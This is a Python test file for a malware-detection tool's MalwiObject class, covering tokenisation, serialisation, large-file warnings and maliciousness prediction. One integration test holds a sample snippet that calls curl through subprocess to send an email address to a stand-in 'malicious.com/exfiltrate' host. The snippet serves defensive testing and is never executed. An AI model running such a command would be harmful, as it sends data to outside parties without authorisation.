"""Test the MalwiObject class and its methods."""

import pytest
import tempfile
import yaml
from pathlib import Path
from unittest.mock import patch, MagicMock

from common.mapping import SpecialCases
from common.malwi_object import MalwiObject, LiteralStr
from common.bytecode import ASTCompiler


class TestMalwiObject:
    """Test suite for MalwiObject class."""

    @pytest.fixture
    def sample_bytecode(self):
        """Create sample bytecode for testing."""
        # Mock bytecode instructions for testing
        from unittest.mock import MagicMock

        mock_instruction = MagicMock()
        mock_instruction.to_string.return_value = "LOAD_CONST test"
        return [mock_instruction]

    @pytest.fixture
    def malwi_obj(self, sample_bytecode):
        """Create a MalwiObject instance for testing."""
        return MalwiObject(
            name="test_function",
            language="python",
            file_source_code="def test(): pass",
            file_path="test.py",
            byte_code=sample_bytecode,
            source_code="def test(): pass",
            location=(1, 1),
        )

    def test_to_tokens_and_string(self, malwi_obj):
        """Test token extraction and string conversion."""
        tokens = malwi_obj.to_tokens()
        assert isinstance(tokens, list)

        token_string = malwi_obj.to_token_string()
        assert isinstance(token_string, str)

    def test_source_code_population(self, malwi_obj):
        """Test source code population."""
        # Should have source code from merged properties
        assert malwi_obj.source_code is not None
        assert isinstance(malwi_obj.source_code, str)

    @patch("common.malwi_object.get_node_text_prediction")
    def test_predict(self, mock_predict, malwi_obj):
        """Test maliciousness prediction."""
        mock_predict.return_value = {"probabilities": [0.3, 0.7]}

        # Mock the to_tokens method to return special tokens so prediction is triggered
        with patch.object(
            malwi_obj,
            "to_token_string",
            return_value="DYNAMIC_CODE_EXECUTION test_function",
        ):
            result = malwi_obj.predict()

        # Should have set maliciousness score
        assert malwi_obj.labels.get("malicious") == 0.7
        assert result == {"probabilities": [0.3, 0.7]}

    def test_predict_no_special_tokens(self, malwi_obj):
        """Test prediction when no special tokens are present."""
        # Mock to_token_string to return tokens without special tokens
        with patch.object(
            malwi_obj,
            "to_token_string",
            return_value="normal_function call",
        ):
            result = malwi_obj.predict()

        # Should now analyze even without special tokens
        assert malwi_obj.labels is not None
        assert result is not None
        assert "probabilities" in result

    def test_to_dict_yaml_json(self, malwi_obj):
        """Test conversion to dict, YAML, and JSON."""
        malwi_obj.labels = {"malicious": 0.8}
        # Code is now available via the property

        # Test to_dict
        data = malwi_obj.to_dict()
        assert isinstance(data, dict)
        assert "path" in data
        assert "contents" in data
        assert data["path"] == "test.py"
        assert len(data["contents"]) == 1

        # Test to_yaml
        yaml_str = malwi_obj.to_yaml()
        assert isinstance(yaml_str, str)
        assert "test_function" in yaml_str

        # Test to_json
        json_str = malwi_obj.to_json()
        assert isinstance(json_str, str)
        assert "test_function" in json_str

    def test_string_hash(self, malwi_obj):
        """Test string hash generation."""
        hash_val = malwi_obj.to_hash()
        assert isinstance(hash_val, str)
        assert len(hash_val) == 64  # SHA256 hex digest

    def test_all_tokens_class_method(self):
        """Test the all_tokens class method."""
        tokens = MalwiObject.all_tokens("python")
        assert isinstance(tokens, list)
        assert len(tokens) > 0
        assert all(isinstance(token, str) for token in tokens)

    def test_malwi_object_with_warnings(self):
        """Test MalwiObject creation with warnings."""
        obj = MalwiObject(
            name="error_object",
            language="python",
            file_path="error.py",
            file_source_code="invalid syntax",
            warnings=[SpecialCases.MALFORMED_SYNTAX.value],
        )

        # Test that warnings are handled in prediction
        # Since there's no bytecode, prediction should use warnings + MALFORMED_FILE
        result = obj.predict()
        # Now all objects are analyzed, even those with warnings
        assert obj.labels is not None
        assert result is not None

    def test_malwi_object_javascript(self):
        """Test MalwiObject with JavaScript language."""
        obj = MalwiObject(
            name="test_function",
            language="javascript",
            file_path="test.js",
            file_source_code="function test() { return true; }",
        )

        assert obj.language == "javascript"
        # Test token extraction if bytecode is available
        if obj.byte_code:
            tokens = obj.to_tokens()
            assert isinstance(tokens, list)
        # For JavaScript objects created manually, bytecode may not be created
        # This is fine as the test is just checking the object creation

    def test_large_file_warning(self):
        """Test that LARGE_FILE warning is added for files >500KB."""
        # Create a large temporary file for testing
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            # Write 600KB of content (bigger than 500KB threshold)
            large_content = 'x = "' + "A" * (600 * 1024) + '"'
            f.write(large_content)
            large_file_path = f.name

        try:
            # Create MalwiObject with the large file
            obj = MalwiObject(
                name="large_file_test",
                language="python",
                file_path=large_file_path,
                file_source_code=large_content,
            )

            # Get tokens and check for LARGE_FILE warning
            tokens = obj.to_tokens()
            assert SpecialCases.LARGE_FILE.value in tokens
            # LARGE_FILE should be one of the first tokens (warnings come first)
            assert tokens.index(SpecialCases.LARGE_FILE.value) < 5

        finally:
            # Clean up the temporary file
            Path(large_file_path).unlink()

    def test_small_file_no_warning(self):
        """Test that small files do not get LARGE_FILE warning."""
        # Create a small temporary file for testing
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            small_content = 'x = "small content"'
            f.write(small_content)
            small_file_path = f.name

        try:
            # Create MalwiObject with the small file
            obj = MalwiObject(
                name="small_file_test",
                language="python",
                file_path=small_file_path,
                file_source_code=small_content,
            )

            # Get tokens and check that LARGE_FILE warning is NOT present
            tokens = obj.to_tokens()
            assert SpecialCases.LARGE_FILE.value not in tokens

        finally:
            # Clean up the temporary file
            Path(small_file_path).unlink()

    def test_nonexistent_file_no_warning(self):
        """Test that nonexistent files don't cause errors and don't get LARGE_FILE warning."""
        obj = MalwiObject(
            name="nonexistent_file_test",
            language="python",
            file_path="/nonexistent/path/file.py",
            file_source_code="pass",
        )

        # Should not raise an error and should not have LARGE_FILE warning
        tokens = obj.to_tokens()
        assert SpecialCases.LARGE_FILE.value not in tokens


def test_literal_str():
    """Test LiteralStr class."""
    literal = LiteralStr("test\nmultiline\nstring")
    assert isinstance(literal, str)
    assert str(literal) == "test\nmultiline\nstring"


def test_malwi_object_creation_minimal():
    """Test minimal MalwiObject creation."""
    obj = MalwiObject(
        name="minimal",
        language="python",
        file_path="minimal.py",
        file_source_code="pass",
    )

    assert obj.name == "minimal"
    assert obj.language == "python"
    assert obj.file_path == "minimal.py"
    assert obj.labels == {}
    assert obj.byte_code is None


def test_malwi_object_serialization_attributes():
    """Test that MalwiObject has correct attributes for serialization (regression test)."""
    obj = MalwiObject(
        name="serialization_test",
        language="python",
        file_path="/test/path/file.py",
        file_source_code="print('test')",
    )

    # Test that the object has the expected attributes
    assert hasattr(obj, "file_path")
    assert not hasattr(obj, "path")  # Should not have old attribute
    assert obj.file_path == "/test/path/file.py"

    # Test serialization scenarios that were failing
    # This simulates what happens in csv_writer.py
    try:
        csv_data = [
            obj.to_string(one_line=True, mapped=True),
            obj.to_hash(),
            obj.language,
            obj.file_path,  # This was obj.path before and caused the error
        ]
        assert len(csv_data) == 4
        assert csv_data[3] == "/test/path/file.py"
    except AttributeError as e:
        pytest.fail(f"CSV serialization failed: {e}")

    # Test serialization scenarios that were failing
    # This simulates what happens in preprocess.py
    try:
        obj_data = {
            "tokens": obj.to_string(one_line=True),
            "hash": obj.to_hash(),
            "language": obj.language,
            "filepath": str(obj.file_path),  # This was str(obj.path) before
        }
        assert "filepath" in obj_data
        assert obj_data["filepath"] == "/test/path/file.py"
    except AttributeError as e:
        pytest.fail(f"Preprocessing serialization failed: {e}")


def test_malwi_object_string_mapping_functions():
    """Test that string mapping functions work correctly with existing mappings."""
    # Create test code with patterns that should trigger existing mappings
    test_code = """
email = "user@example.com"
insecure_url = "http://insecure.com"
protocol_mention = "Connect via ftp server"
secure_url = "https://secure.com"
ftp_site = "ftp://files.example.com"
    """

    # Test with actual AST compilation to ensure integration works
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_file = f.name

    try:
        # Use the AST compiler to create MalwiObjects with real bytecode
        from common.malwi_object import disassemble_file_ast

        with open(temp_file, "r") as f:
            source_code = f.read()

        malwi_objects = disassemble_file_ast(source_code, temp_file, "python")

        assert len(malwi_objects) > 0
        obj = malwi_objects[0]  # Get the main module object

        # Test that the object was created successfully
        assert obj.file_path == temp_file
        assert obj.language == "python"
        assert obj.byte_code is not None

        # Get the token string and verify existing mappings are working
        token_string = obj.to_token_string()

        # Check for existing mapping tokens that should be present
        expected_tokens = [
            "STRING_URL",  # URLs should be mapped to STRING_URL
            "STRING",  # Generic strings should be mapped to STRING
        ]

        found_tokens = []
        for token in expected_tokens:
            if token in token_string:
                found_tokens.append(token)

        # Verify that basic string mappings are working
        assert len(found_tokens) >= 1, (
            f"Expected basic string mapping tokens, got: {found_tokens}\nFull token string: {token_string}"
        )

        # Verify URLs are mapped correctly
        assert "STRING_URL" in token_string

        # Test that serialization works correctly
        try:
            serialization_test = {
                "tokens": obj.to_string(one_line=True),
                "hash": obj.to_hash(),
                "language": obj.language,
                "filepath": str(obj.file_path),
            }
            assert "filepath" in serialization_test
            assert serialization_test["language"] == "python"
        except Exception as e:
            pytest.fail(f"Serialization with string mappings failed: {e}")

    finally:
        # Clean up
        Path(temp_file).unlink()


def test_malwi_object_integration_with_ast_compiler():
    """Test full integration between MalwiObject and ASTCompiler (regression test)."""
    # Create a test file that would have caused the serialization error
    test_code = """
import os
import subprocess

def suspicious_function():
    email = "admin@target.com"
    subprocess.call(["curl", "http://malicious.com/exfiltrate", "-d", email])
    """

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_file = f.name

    try:
        # Test the full pipeline that was failing in preprocessing
        compiler = ASTCompiler("python")
        malwi_objects = compiler.process_file(Path(temp_file))

        assert len(malwi_objects) > 0

        for obj in malwi_objects:
            # Test all the operations that were failing in preprocessing
            assert hasattr(obj, "file_path")
            assert not hasattr(obj, "path")

            # Test csv_writer.py scenario
            csv_row_data = [
                obj.to_string(one_line=True, mapped=True),
                obj.to_hash(),
                obj.language,
                obj.file_path,  # This line was causing the error
            ]
            assert len(csv_row_data) == 4
            assert csv_row_data[3] == temp_file

            # Test preprocess.py scenario
            obj_data = {
                "tokens": obj.to_string(one_line=True),
                "hash": obj.to_hash(),
                "language": obj.language,
                "filepath": str(obj.file_path),  # This line was causing the error
            }
            assert obj_data["filepath"] == temp_file
            assert obj_data["language"] == "python"

            # Test that token mapping is working - different objects have different tokens
            token_string = obj.to_token_string()
            # Should have some recognizable tokens (different per object)
            basic_tokens_found = any(
                token in token_string
                for token in [
                    "LOAD_CONST",
                    "STORE_NAME",
                    "IMPORT_NAME",
                    "MAKE_FUNCTION",
                    "STRING_URL",
                    "PROCESS_MANAGEMENT",
                    "SYSTEM_INTERACTION",
                ]
            )
            # Basic token generation should work
            assert basic_tokens_found, f"No basic tokens found in: {token_string}"

    finally:
        # Clean up
        Path(temp_file).unlink()
